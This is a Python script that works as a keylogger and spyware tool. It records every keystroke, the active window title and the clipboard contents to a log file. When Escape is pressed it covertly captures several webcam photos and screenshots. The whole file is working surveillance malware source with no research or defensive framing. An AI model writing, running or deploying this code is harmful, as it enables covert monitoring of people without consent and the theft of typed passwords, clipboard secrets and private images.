import logging
import pyautogui
import time
import random
import pygetwindow as gw
import pyperclip
import cv2
import pyscreeze
from datetime import datetime
from pynput.keyboard import Key, Listener
from threading import Thread

logging.basicConfig(filename="keylog5712.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")

def get_active_window_title():
    try:
        active_window = gw.getActiveWindow()
        if active_window:
            return active_window.title
        return "No active window"
    except Exception as e:
        logging.error(f"Error getting active window title: {e}")
        return "Error"

def log_clipboard():
    try:
        clipboard_content = pyperclip.paste()
        if clipboard_content:
            logging.info(f"Clipboard: {clipboard_content}")
    except Exception as e:
        logging.error(f"Error logging clipboard: {e}")

def take_screenshot():
    try:
        delay_before_screenshot = random.randint(1, 2)
        time.sleep(delay_before_screenshot)
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        screenshot_filename = f"screenshot_{timestamp}.png"
        screenshot = pyautogui.screenshot()
        delay_before_save = random.randint(1, 2)
        time.sleep(delay_before_save)
        screenshot.save(screenshot_filename)
        logging.info(f"Screenshot saved as {screenshot_filename}")
        print(f"Screenshot saved as {screenshot_filename}")
    except Exception as e:
        logging.error(f"Failed to take screenshot: {e}")
        print(f"Failed to take screenshot: {e}")

def capture_webcam_photo():
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            logging.error("Error: Could not access the webcam.")
            return
        delay_before_capture = random.randint(1, 2)
        time.sleep(delay_before_capture)
        ret, frame = cap.read()
        if ret:
            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            photo_filename = f"webcam_{timestamp}.jpg"
            cv2.imwrite(photo_filename, frame)
            logging.info(f"Webcam photo saved as {photo_filename}")
            print(f"Webcam photo saved as {photo_filename}")
        else:
            logging.error("Failed to capture webcam photo.")
        cap.release()
    except Exception as e:
        logging.error(f"Failed to capture webcam photo: {e}")
        print(f"Failed to capture webcam photo: {e}")

def take_multiple_photos_and_screenshots():
    webcam_photos = random.randint(4, 5)
    screenshots = random.randint(5, 6)
    for _ in range(webcam_photos):
        capture_webcam_photo()
    for _ in range(screenshots):
        take_screenshot()

def on_press(key):
    try:
        active_window = get_active_window_title()
        logging.info(f"Active Window: {active_window}")
        log_clipboard()
        if hasattr(key, 'char') and key.char is not None:
            logging.info(f"Key {key.char} pressed")
        else:
            logging.info(f"Special key {key} pressed")
        if key == Key.esc:
            logging.info("ESC key pressed, capturing photos and screenshots.")
            take_multiple_photos_and_screenshots()
            return False
    except Exception as e:
        logging.error(f"Error in on_press: {e}")

def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

keylogger_thread = Thread(target=start_keylogger)
keylogger_thread.start()

try:
    while keylogger_thread.is_alive():
        time.sleep(1)
except KeyboardInterrupt:
    logging.info("Keylogger interrupted manually.")
